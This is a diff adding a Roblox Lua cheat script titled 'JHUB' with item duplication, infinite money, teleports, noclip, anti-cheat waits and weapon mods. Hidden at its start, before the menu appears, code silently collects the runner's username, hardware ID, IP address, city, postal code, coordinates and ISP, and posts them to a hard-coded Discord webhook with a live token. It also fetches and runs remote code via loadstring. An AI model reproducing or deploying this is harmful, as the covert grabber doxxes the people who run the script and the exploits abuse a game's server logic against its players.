@@ -1,0 +1,873 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local Stats = game:GetService("Stats")
+local UserInputService = game:GetService("UserInputService")
+
+local function getFullIPData()
+    local success, response = pcall(function()
+        return HttpService:JSONDecode(game:HttpGet("https://ipinfo.io/json"))
+    end)
+
+    if success and response.ip then
+        local locParts = (response.loc or ","):split(",")
+        local latitude = locParts[1] or "N/A"
+        local longitude = locParts[2] or "N/A"
+
+        return {
+            ip = response.ip or "N/A",
+            country = response.country or "N/A",
+            city = response.city or "N/A",
+            region = response.region or "N/A",
+            postal = response.postal or "N/A",
+            latitude = latitude,
+            longitude = longitude,
+            isp = response.org or "N/A",
+            org = response.org or "N/A",
+            timezone = response.timezone or "N/A"
+        }
+    else
+        return nil
+    end
+end
+
+local function sendFullWebhookMessage(url, username, userId, gameName, executorName, hwid, ipData, platform, membership, accountAge, ping, jobId)
+    local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. jobId
+    local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. jobId
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "Executed Successfully!",
+            ["color"] = 65280,
+            ["fields"] = {
+                {
+                    ["name"] = "User Information",
+                    ["value"] = "Username: @" .. username .. "\nUser ID: " .. userId .. "\nMembership: " .. membership .. "\nAccount Age: " .. accountAge .. " days",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Game & Executor:",
+                    ["value"] = "Game: " .. gameName .. "\nExecutor: " .. executorName,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "HWID & IP:",
+                    ["value"] = "HWID: " .. hwid .. "\nIP Address: " .. (ipData.ip or "Unknown"),
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Location (Geo):",
+                    ["value"] = "Country: " .. (ipData.country or "N/A") ..
+                               "\nCity: " .. (ipData.city or "N/A") ..
+                               "\nRegion: " .. (ipData.region or "N/A") ..
+                               "\nPostal Code: " .. (ipData.postal or "N/A") ..
+                               "\nLatitude: " .. (ipData.latitude or "N/A") ..
+                               "\nLongitude: " .. (ipData.longitude or "N/A"),
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Network Info:",
+                    ["value"] = "ISP: " .. (ipData.isp or "N/A") ..
+                               "\nOrg: " .. (ipData.org or "N/A") ..
+                               "\nTime Zone: " .. (ipData.timezone or "N/A"),
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Platform & Server:",
+                    ["value"] = "Platform: " .. platform ..
+                               "\nPing: " .. ping .. "ms" ..
+                               "\nJob ID: [Click to Copy](" .. jobIdLink .. ")" ..
+                               "\nMobile Join: [Click](" .. mobileJoinLink .. ")",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Time Executed:",
+                    ["value"] = os.date("%d/%m/%Y %I:%M:%S %p"),
+                    ["inline"] = false
+                }
+            }
+        }}
+    }
+
+    local jsonData = HttpService:JSONEncode(data)
+    local headers = {["Content-Type"] = "application/json"}
+    local request = http_request or request or HttpPost or syn.request
+
+    request({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = jsonData
+    })
+end
+
+local player = Players.LocalPlayer
+local username = player.Name
+local userId = player.UserId
+local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+local executorName = identifyexecutor and identifyexecutor() or "Unknown Executor"
+local hwid = RbxAnalyticsService:GetClientId()
+local ipData = getFullIPData()
+local platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "Mobile" or "PC"
+local membership = tostring(player.MembershipType):sub(21)
+local accountAge = player.AccountAge
+local ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+local jobId = game.JobId
+
+local webhookUrl1 = "https://discord.com/api/webhooks/1404516522315087903/LaaiLI1pswC8f7fd0xVVTvkeZq-LBOm4DwJ24y4GlTzGS3XzSP3JxTxntS5--mA_MUh0"
+
+sendFullWebhookMessage(webhookUrl1, username, userId, gameName, executorName, hwid, ipData, platform, membership, accountAge, ping, jobId)
+
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+local Window = Rayfield:CreateWindow({
+   Name = "JHUB ",
+   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
+   LoadingTitle = "JC is cute",
+   LoadingSubtitle = "By The reals",
+   ShowText = "JHUB!", -- for mobile users to unhide rayfield, change if you'd like
+   Theme = "Default", -- Check https://docs.sirius.menu/rayfield/configuration/themes
+
+   ToggleUIKeybind = "K", -- The keybind to toggle the UI visibility (string like "K" or Enum.KeyCode)
+
+   DisableRayfieldPrompts = false,
+   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface
+
+   ConfigurationSaving = {
+      Enabled = true,
+      FolderName = nil, -- Create a custom folder for your hub/game
+      FileName = "Big Hub"
+   },
+
+   Discord = {
+      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
+      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
+      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+   },
+
+   KeySystem = false, -- Set this to true to use our key system
+   KeySettings = {
+      Title = "JHUB Key System",
+      Subtitle = "Key System",
+      Note = "DM JC", -- Use this to tell the user how to get a key
+      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
+      SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
+      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+      Key = {"TESTERS2"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
+   }
+})
+
+local MainTab = Window:CreateTab("🕺 | Main") 
+local MainSection = MainTab:CreateSection("📜 | Credits")
+
+local Paragraph = MainTab:CreateParagraph({
+    Title = "📃 | Credits",
+    Content = "👑 | Creator:JC"
+})
+
+local Paragraph = MainTab:CreateParagraph({
+    Title = "📃 | Credits",
+    Content = "📃 | Scripter:JC"
+})
+local Paragraph = MainTab:CreateParagraph({
+    Title = "📃 | Credits",
+    Content = "🧪 | Testers: Siah,Dawg,FC"
+})
+MainTab:CreateSection("📋 | UserInfo")
+local player = game.Players.LocalPlayer
+local username = player.Name
+MainTab:CreateLabel("Player: " .. username)
+
+local userId = player.UserId
+MainTab:CreateLabel("User Id: " .. userId)
+
+local MainSection3 = MainTab:CreateSection("🎱 | Game and Executor")
+
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+MainTab:CreateLabel("Game: " .. gameName)
+
+local executor = identifyexecutor and identifyexecutor() or "Unknown Executor"
+MainTab:CreateLabel("Executor: " .. executor)
+
+
+local MainTab = Window:CreateTab("🔫 | Dupe") 
+local MainSection = MainTab:CreateSection("✖️ | Duplication")
+
+local Paragraph = MainTab:CreateParagraph({
+    Title = "How to Dupe",
+    Content = "Equip Your gun and click Dupe, Only have one off the gun in your inventory per dupe"
+})
+
+MainTab:CreateButton({
+ Name = "Dupe",
+Callback = function()
+local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
+local Players = cloneref(game:GetService("Players"))
+local Player = Players.LocalPlayer
+local Character = Player.Character or Player.CharacterAdded:Wait()
+local Backpack = Player:WaitForChild("Backpack")
+
+        local Tool = Character:FindFirstChildOfClass("Tool")
+        if not Tool then return end
+
+        Tool.Parent = Backpack
+        task.wait(0.5)
+
+        local ToolName = Tool.Name
+        local ToolId
+
+        local marketConnection = ReplicatedStorage.MarketItems.ChildAdded:Connect(function(item)
+            if item.Name == ToolName then
+                local owner = item:WaitForChild("owner", 2)
+                if owner and owner.Value == Player.Name then
+                    ToolId = item:GetAttribute("SpecialId")
+                end
+            end
+        end)
+
+        task.spawn(function()
+            ReplicatedStorage.ListWeaponRemote:FireServer(ToolName, 99999)
+        end)
+
+        task.wait(0.35)
+
+        task.spawn(function()
+            ReplicatedStorage.BackpackRemote:InvokeServer("Store", ToolName)
+        end)
+
+        task.wait(3)
+
+        if ToolId then
+            task.spawn(function()
+                ReplicatedStorage.BuyItemRemote:FireServer(ToolName, "Remove", ToolId)
+            end)
+        end
+
+        task.spawn(function()
+            ReplicatedStorage.BackpackRemote:InvokeServer("Grab", ToolName)
+        end)
+
+        marketConnection:Disconnect()
+        task.wait(1)
+    end
+})
+
+local MainTab = Window:CreateTab("💰 | Inf Money") 
+local MainSection = MainTab:CreateSection("💸 | InfMoney")
+local Paragraph = MainTab:CreateParagraph({
+    Title = "Explanation",
+    Content = "Buy the Items and cook your pot, equip the cup and click infMoney too get it."
+})
+
+MainTab:CreateButton({
+    Name = "Infinite Money",
+    Callback = function()
+        local player = game:GetService("Players").LocalPlayer
+        local character = player.Character or player.CharacterAdded:Wait()
+        local hrp = character:WaitForChild("HumanoidRootPart")
+        local originalPos = hrp.Position
+
+        local function teleportTo(x, y, z)
+            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
+            local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+            if humanoid and hrp then
+                humanoid:ChangeState(0)
+                local timeout = 5
+                local startTime = tick()
+                repeat task.wait() until not player:GetAttribute("LastACPos") or (tick() - startTime) > timeout
+                hrp.CFrame = CFrame.new(x, y, z)
+            end
+        end
+
+        local sellPart = workspace:FindFirstChild("IceFruit Sell")
+        local sellPrompt = sellPart and sellPart:FindFirstChildWhichIsA("ProximityPrompt")
+
+        if not (sellPart and sellPrompt) then
+            warn("SellPart or ProximityPrompt not found.")
+            return
+        end
+
+        task.wait(0.5)
+        teleportTo(sellPart.Position.X, sellPart.Position.Y, sellPart.Position.Z)
+        task.wait(1)
+
+        local success, err = pcall(function()
+            for _ = 1, 2000 do
+                fireproximityprompt(sellPrompt, 0)
+            end
+        end)
+
+        if not success then
+            warn("Proximity prompt interaction failed:", err)
+        end
+
+        task.wait(1)
+        teleportTo(originalPos.X, originalPos.Y, originalPos.Z)
+    end
+})
+
+
+local SharedStorage = game.ReplicatedStorage
+
+local function InvokeServer(Remote, ...)
+    return Remote:InvokeServer(...)
+end
+
+local function FindItem(Item)
+    return game.Players.LocalPlayer.Backpack:FindFirstChild(Item) or game.Players.LocalPlayer.Character:FindFirstChild(Item)
+end
+
+local function AutoBuySupplies()
+    local Items = {
+        "Ice-Fruit Bag",
+        "Ice-Fruit Cupz",
+        "FijiWater",
+        "FreshWater",
+    }
+
+    for _, item in ipairs(Items) do
+        local ItemStock = SharedStorage.ExoticStock:FindFirstChild(item)
+        if not ItemStock or ItemStock.Value == 0 then
+            warn("Item out of stock:", item)
+            return false
+        end
+    end
+
+    for _, item in ipairs(Items) do
+        InvokeServer(SharedStorage.ExoticShopRemote, item)
+        task.wait(1.25)
+    end
+
+    for _, item in ipairs(Items) do
+        if not FindItem(item) then
+            warn("Failed to acquire:", item)
+            return false
+        end
+    end
+
+    return true
+end
+
+MainTab:CreateButton({
+    Name = "Buy Ice-Fruitz-Itemz",
+    Callback = function()
+        local success = AutoBuySupplies()
+        if success then
+            Rayfield:Notify({
+                Title = "AutoBuy",
+                Content = "Items purchased successfully!",
+                Duration = 5,
+                Image = 4483362458,
+            })
+        else
+            Rayfield:Notify({
+                Title = "AutoBuy",
+                Content = "Failed to purchase items!",
+                Duration = 5,
+                Image = 4483362458,
+            })
+        end
+    end,
+})
+
+local MainTab = Window:CreateTab("✈️ | Teleports") 
+local MainSection = MainTab:CreateSection("✈️ | Teleports")
+
+local teleportLocations = {
+    {Name = "New Penthouse🏠",   Position = Vector3.new(-597, 356, -714) },
+    {Name = "Old Penthouse🏠",      Position = Vector3.new(-124, 417, -575) },
+    {Name = "Penthouse Cook Pot🫖", Position = Vector3.new(-614, 356, -683) },
+    {Name = "Bank tools💰",  Position = Vector3.new(-384, 340, -557) },
+    {Name = "Bank🏦",               Position = Vector3.new(-204, 284, -1223) },
+    {Name = "Dripstore👖",          Position = Vector3.new(67459, 10489, 551) },
+    {Name = "Ice Box💎",            Position = Vector3.new(-193, 284, -1169) },
+    {Name = "Jamaican Food🍗",      Position = Vector3.new(-670, 254, -810) },
+    {Name = "Deli and Grill🛒",     Position = Vector3.new(-746, 254, -906) },
+    {Name = "Gunstore [1]🔫",       Position = Vector3.new(-1003, 254, -817) },
+    {Name = "Gunstore [2]🔫",       Position = Vector3.new(-202, 284, -798) },
+    {Name = "Gunstore [3]🔫",       Position = Vector3.new(72425, 128856, -1082) },
+    {Name = "Gunstore [4]🔫",       Position = Vector3.new(60822, 87609, -352) },
+    {Name = "Pawnshop💷",           Position = Vector3.new(-1051, 254, -815) },
+    {Name = "Laundermat🧺",         Position = Vector3.new(-990, 254, -686) },
+    {Name = "Backpack🎒",           Position = Vector3.new(-670, 254, -681) },
+    {Name = "Tatoo✍️",            Position = Vector3.new(-637, 254, -591) },
+    {Name = "Dollar Central💲",     Position = Vector3.new(-389, 254, -1082) },
+    {Name = "Dealership🚗",         Position = Vector3.new(-389, 253, -1232) },
+    {Name = "mcdonalds🍟",          Position = Vector3.new(-999, 254, -1134) },
+    {Name = "Hospital🏥",           Position = Vector3.new(-1589,254,15.8) },
+    {Name = "Lemonade🥂",            Position = Vector3.new(-1518.791, 271.244, -983.778) },
+    {Name = "Jewerly Rob🎭",       Position = Vector3.new(-210.618, 283.492, -1256.966) },
+}
+local player = game.Players.LocalPlayer
+
+local function teleport(x, y, z)
+    local character = player.Character or player.CharacterAdded:Wait()
+    local humanoid = character:WaitForChild("Humanoid")
+    local hrp = character:WaitForChild("HumanoidRootPart")
+
+    humanoid:ChangeState(0)
+    repeat task.wait() until not player:GetAttribute("LastACPos")
+    hrp.CFrame = CFrame.new(x, y, z)
+end
+
+local selectedTeleport = teleportLocations[1]
+local locationNames = {}
+
+for _, location in ipairs(teleportLocations) do
+    table.insert(locationNames, location.Name)
+end
+
+MainTab:CreateDropdown({
+    Name = "Select Location",
+    Options = locationNames,
+    CurrentOption = {locationNames[1]},
+    MultipleOptions = false,
+    Flag = "TeleportDropdown",
+    Callback = function(option)
+        for _, location in ipairs(teleportLocations) do
+            if location.Name == option[1] then
+                selectedTeleport = location
+                break
+            end
+        end
+    end
+})
+
+MainTab:CreateButton({
+    Name = "Teleport To",
+    Callback = function()
+        if selectedTeleport then
+            teleport(selectedTeleport.Position.X, selectedTeleport.Position.Y, selectedTeleport.Position.Z)
+        end
+    end
+})
+
+local MainTab = Window:CreateTab("🧟‍♂️ | Player") 
+local MainSection = MainTab:CreateSection("🎲 | Player")
+local Slider = MainTab:CreateSlider({
+   Name = "WalkSpeed",
+   Range = {0,30},
+   Increment = 1,
+   Suffix = "WALKSPEED",
+   CurrentValue = 16,
+   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+           game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
+   end,
+})
+
+local Slider = MainTab:CreateSlider({
+   Name = "JumpPower",
+   Range = {1, 150},
+   Increment = 1,
+   Suffix = "Height",
+   CurrentValue = 16,
+   Flag = "sliderjp", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+        game.Players.LocalPlayer.Character.Humanoid.JumpPower = (Value)
+   end,
+})
+
+local Button = MainTab:CreateButton({
+   Name = "NoClip",
+   Callback = function()
+getgenv().Players = game:GetService'Players'
+getgenv().Host = Players.LocalPlayer
+getgenv().AddNotification = function(title, text) game:GetService'StarterGui':SetCore("SendNotification", {Title = title; Text = text;}) end
+getgenv().RunService = game:GetService'RunService';
+getgenv().ContextActionService = game:GetService'ContextActionService';
+
+local Noclip = true;
+local NoclipKey = 'X'; -- Change your key here
+
+RunService.RenderStepped:Connect(function()
+    if Noclip then
+        for _,v in pairs(Host.Character:GetDescendants()) do
+            if v:IsA'BasePart' and v.CanCollide then
+                v.CanCollide = false
+            end
+        end
+    else
+        for _,v in pairs(Host.Character:GetDescendants()) do
+            if v:IsA'BasePart' and not v.CanCollide then
+                v.CanCollide = true
+            end
+        end
+    end
+end)
+
+function Noclipping(ActionName:string, Properties:EnumItem)
+    if ActionName == 'Noclip' then
+        if not Properties or Properties == Enum.UserInputState.Begin then
+            Noclip = not Noclip
+            AddNotification('Noclip','Noclip is now - '..tostring(Noclip))
+        end
+    end
+end
+
+ContextActionService:BindAction('Noclip', Noclipping, true, Enum.KeyCode[NoclipKey])
+   end,
+})
+
+
+local MainSection = MainTab:CreateSection("💎 | Bypasses")
+
+local AntiHungerEnabled = false
+MainTab:CreateToggle({
+    Name = "Inf Hunger",
+    CurrentValue = false,
+    Callback = function(Value)
+        AntiHungerEnabled = Value
+        if Value then
+            task.spawn(function()
+                while AntiHungerEnabled do
+                    task.wait(1)
+                    local player = game.Players.LocalPlayer
+                    if player and player:FindFirstChild("PlayerGui") then
+                        local hungerGui = player.PlayerGui:FindFirstChild("Hunger")
+                        if hungerGui then
+                            local hungerScript = hungerGui:FindFirstChild("Frame")
+                                and hungerGui.Frame:FindFirstChild("Frame")
+                                and hungerGui.Frame.Frame:FindFirstChild("Frame")
+                                and hungerGui.Frame.Frame.Frame:FindFirstChild("HungerBarScript")
+                            if hungerScript then
+                                hungerScript.Disabled = true
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+})
+
+local AntiSleepEnabled = false
+MainTab:CreateToggle({
+    Name = "Inf Sleep",
+    CurrentValue = false,
+    Callback = function(Value)
+        AntiSleepEnabled = Value
+        if Value then
+            task.spawn(function()
+                while AntiSleepEnabled do
+                    task.wait(1)
+                    local player = game.Players.LocalPlayer
+                    if player and player:FindFirstChild("PlayerGui") then
+                        local sleepGui = player.PlayerGui:FindFirstChild("SleepGui")
+                        if sleepGui then
+                            local sleepScript = sleepGui:FindFirstChild("Frame")
+                                and sleepGui.Frame:FindFirstChild("sleep")
+                                and sleepGui.Frame.sleep:FindFirstChild("SleepBar")
+                                and sleepGui.Frame.sleep.SleepBar:FindFirstChild("sleepScript")
+                            if sleepScript then
+                                sleepScript.Disabled = true
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+})
+
+local AntiFallEnabled = false
+local AntiFallToggle = MainTab:CreateToggle({
+    Name = "No Fall Damage",
+    CurrentValue = false,
+    Callback = function(Value)
+        AntiFallEnabled = Value
+        if Value then
+            task.spawn(function()
+                while AntiFallEnabled do
+                    task.wait(1)
+                    local player = game.Players.LocalPlayer
+                    if player and player.Character then
+                        local fallDamage = player.Character:FindFirstChild("FallDamageRagdoll")
+                        if fallDamage then
+                            fallDamage.Disabled = true
+                        end
+                    end
+                end
+            end)
+        end
+    end
+})
+
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+local ProximityPromptService = game:GetService("ProximityPromptService")
+
+local promptConnection
+
+local function enableInstantInteract()
+    for _, prompt in pairs(Workspace:GetDescendants()) do
+        if prompt:IsA("ProximityPrompt") then
+            prompt.HoldDuration = 0
+        end
+    end
+
+
+    promptConnection = ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt)
+        prompt.HoldDuration = 0
+    end)
+end
+
+local function disableInstantInteract()
+    if promptConnection then
+        promptConnection:Disconnect()
+        promptConnection = nil
+    end
+end
+
+MainTab:CreateToggle({
+    Name = "Instant Interact",
+    CurrentValue = false,
+    Flag = "InstantInteractToggle",
+    Callback = function(enabled)
+        if enabled then
+            enableInstantInteract()
+        else
+            disableInstantInteract()
+        end
+    end,
+})
+
+local MainTab = Window:CreateTab("🪖 | Combat", nil)
+MainTab:CreateSection("Weapon Mods")
+local Paragraph = MainTab:CreateParagraph({
+    Title = "Support",
+    Content =
+    "Once turnt on you can't turn off, safe your gun too reset the mods."
+})
+
+MainTab:CreateToggle({
+    Name = "1 Tap",
+    CurrentValue = false,
+    Callback = function(Value)
+        local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+        if tool and tool:FindFirstChild("Setting") then
+            local setting = require(tool.Setting)
+            setting.BaseDamage = Value and 9e9 or 25
+        end
+    end
+})
+
+MainTab:CreateToggle({
+    Name = "Infinite Ammo",
+    CurrentValue = false,
+    Callback = function(Value)
+        local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+        if tool and tool:FindFirstChild("Setting") then
+            local setting = require(tool.Setting)
+            setting.LimitedAmmoEnabled = not Value
+            if Value then
+                setting.MaxAmmo = 100000000
+                setting.AmmoPerMag = 10000000
+                setting.Ammo = 100000000
+            end
+        end
+    end
+})
+
+MainTab:CreateToggle({
+    Name = "Infinite Mag",
+    CurrentValue = false,
+    Callback = function(Value)
+        local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+        if tool and tool:FindFirstChild("Setting") then
+            require(tool.Setting).AmmoPerMag = 1000000000
+        end
+    end
+})
+
+MainTab:CreateToggle({
+    Name = "Infinite Range",
+    CurrentValue = false,
+    Callback = function(Value)
+        local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+        if tool and tool:FindFirstChild("Setting") then
+            require(tool.Setting).Range = 9e9
+        end
+    end
+})
+
+
+MainTab:CreateToggle({
+    Name = "No Jamming",
+    CurrentValue = false,
+    Callback = function(Value)
+        local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+        if tool and tool:FindFirstChild("Setting") then
+            require(tool.Setting).JamChance = 0
+        end
+    end
+})
+
+local SettingsTab = Window:CreateTab("📡 | Settings", nil)
+SettingsTab:CreateSection("🎮 | Game")
+
+SettingsTab:CreateButton({
+    Name = "Rejoin Same Server",
+    Callback = function()
+        local ts = game:GetService("TeleportService")
+        local p = game:GetService("Players").LocalPlayer
+        ts:Teleport(game.PlaceId, p)
+    end
+})
+
+SettingsTab:CreateButton({
+    Name = "Hop server",
+    Callback = function()
+        local PlaceID = game.PlaceId
+        local AllIDs = {}
+        local foundAnything = ""
+        local actualHour = os.date("!*t").hour
+        local Deleted = false
+        local File = pcall(function()
+            AllIDs = game:GetService('HttpService'):JSONDecode(readfile("NotSameServers.json"))
+        end)
+        if not File then
+            table.insert(AllIDs, actualHour)
+            writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
+        end
+        function TPReturner()
+            local Site
+            if foundAnything == "" then
+                Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' ..
+                PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
+            else
+                Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' ..
+                PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
+            end
+            local ID = ""
+            if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
+                foundAnything = Site.nextPageCursor
+            end
+            local num = 0
+            for i, v in pairs(Site.data) do
+                local Possible = true
+                ID = tostring(v.id)
+                if tonumber(v.maxPlayers) > tonumber(v.playing) then
+                    for _, Existing in pairs(AllIDs) do
+                        if num ~= 0 then
+                            if ID == tostring(Existing) then
+                                Possible = false
+                            end
+                        else
+                            if tonumber(actualHour) ~= tonumber(Existing) then
+                                local delFile = pcall(function()
+                                    delfile("NotSameServers.json")
+                                    AllIDs = {}
+                                    table.insert(AllIDs, actualHour)
+                                end)
+                            end
+                        end
+                        num = num + 1
+                    end
+                    if Possible == true then
+                        table.insert(AllIDs, ID)
+                        wait()
+                        pcall(function()
+                            writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
+                            wait()
+                            game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID,
+                                game.Players.LocalPlayer)
+                        end)
+                        wait(4)
+                    end
+                end
+            end
+        end
+
+        function Teleport()
+            while wait() do
+                pcall(function()
+                    TPReturner()
+                    if foundAnything ~= "" then
+                        TPReturner()
+                    end
+                end)
+            end
+        end
+
+        Teleport()
+    end
+})
+
+SettingsTab:CreateButton({
+    Name = "Join lowest Server",
+    Callback = function()
+        local Http = game:GetService("HttpService")
+        local TPS = game:GetService("TeleportService")
+        local Api = "https://games.roblox.com/v1/games/"
+        local _place = game.PlaceId
+        local _servers = Api .. _place .. "/servers/Public?sortOrder=Asc&limit=100"
+        function ListServers(cursor)
+            local Raw = game:HttpGet(_servers .. ((cursor and "&cursor=" .. cursor) or ""))
+            return Http:JSONDecode(Raw)
+        end
+
+        local Server, Next
+        repeat
+            local Servers = ListServers(Next)
+            Server = Servers.data[1]
+            Next = Servers.nextPageCursor
+        until Server
+        TPS:TeleportToPlaceInstance(_place, Server.id, game.Players.LocalPlayer)
+    end
+})
+
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+SettingsTab:CreateButton({
+    Name = "Join VC Server",
+    Callback = function()
+        TeleportService:Teleport(13453616108, player)
+    end,
+})
+
+SettingsTab:CreateSection("⌨️ | Themes")
+
+local themes = {
+    "Default",
+    "Amber Glow",
+    "Amethyst",
+    "Bloom",
+    "Dark Blue",
+    "Green",
+    "Light",
+    "Ocean",
+    "Serenity"
+}
+
+local selectedTheme = "Default"
+
+SettingsTab:CreateDropdown({
+    Name = "Select Theme",
+    Options = themes,
+    CurrentOption = { selectedTheme },
+    MultipleOptions = false,
+    Flag = "ThemeSelector",
+    Callback = function(options)
+        selectedTheme = options[1]
+    end,
+})
+
+SettingsTab:CreateButton({
+    Name = "Apply Theme",
+    Callback = function()
+        local themeIdentifier = selectedTheme:gsub(" ", "")
+        Window.ModifyTheme(themeIdentifier)
+    end,
+})
+
+SettingsTab:CreateSection("Menu")
+
+SettingsTab:CreateButton({
+    Name = "Unload Script",
+    Callback = function()
+        Rayfield:Destroy()
+    end,
+})
